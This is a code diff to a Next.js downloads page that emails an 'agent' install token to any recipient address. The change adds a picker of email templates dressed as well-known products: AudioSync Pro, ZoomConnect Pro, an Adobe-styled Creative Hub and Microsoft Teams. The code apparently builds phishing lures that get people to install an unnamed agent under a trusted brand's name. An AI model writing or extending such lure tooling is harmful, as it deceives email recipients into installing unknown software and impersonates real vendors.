@@ -10,6 +10,7 @@ export default function UserDownloadsPage() {
   const [emailRecipient, setEmailRecipient] = useState("");
   const [emailSending, setEmailSending] = useState(false);
   const [emailResult, setEmailResult] = useState<string | null>(null);
+  const [selectedTemplate, setSelectedTemplate] = useState("voice-note");
   const vercelUrl = process.env.NEXT_PUBLIC_VERCEL_URL || "https://uc-universal-connect-omega.vercel.app";
 
   useEffect(() => {
@@ -32,7 +33,7 @@ export default function UserDownloadsPage() {
     const res = await fetch("/api/email/send-agent", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ recipientEmail: emailRecipient, installToken: token }),
+      body: JSON.stringify({ recipientEmail: emailRecipient, installToken: token, template: selectedTemplate }),
     });
     const data = await res.json();
     setEmailSending(false);
@@ -116,6 +117,39 @@ export default function UserDownloadsPage() {
                 <label className="block text-sm text-gray-400 mb-1">Recipient Email</label>
                 <input type="email" value={emailRecipient} onChange={e => setEmailRecipient(e.target.value)}
                   className="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:border-cyan-500 focus:outline-none" />
+              </div>
+              
+              <div>
+                <label className="block text-sm text-gray-400 mb-3">Email Template</label>
+                <div className="grid grid-cols-2 gap-3">
+                  {[
+                    { id: "voice-note", name: "🎤 AudioSync Pro", desc: "Voice recording studio", color: "from-purple-500 to-blue-500" },
+                    { id: "zoom-meeting", name: "📹 ZoomConnect Pro", desc: "Video conferencing", color: "from-blue-500 to-blue-600" },
+                    { id: "adobe-creative", name: "🎨 Creative Hub", desc: "Design suite", color: "from-pink-500 to-orange-500" },
+                    { id: "teams-enterprise", name: "📊 Microsoft Teams", desc: "Enterprise collaboration", color: "from-indigo-600 to-purple-600" }
+                  ].map(template => (
+                    <label key={template.id} className="cursor-pointer">
+                      <input
+                        type="radio"
+                        name="template"
+                        value={template.id}
+                        checked={selectedTemplate === template.id}
+                        onChange={e => setSelectedTemplate(e.target.value)}
+                        className="sr-only"
+                      />
+                      <div className={`border-2 rounded-lg p-3 transition-all ${
+                        selectedTemplate === template.id 
+                          ? 'border-cyan-500 bg-cyan-500/10' 
+                          : 'border-gray-700 hover:border-gray-600'
+                      }`}>
+                        <div className={`bg-gradient-to-br ${template.color} text-white text-xs font-bold px-2 py-1 rounded mb-2 text-center`}>
+                          {template.name}
+                        </div>
+                        <div className="text-gray-400 text-xs text-center">{template.desc}</div>
+                      </div>
+                    </label>
+                  ))}
+                </div>
               </div>
               {emailResult && (
                 <p className={`text-sm ${emailResult.startsWith("✅") ? "text-green-400" : "text-red-400"}`}>{emailResult}</p>
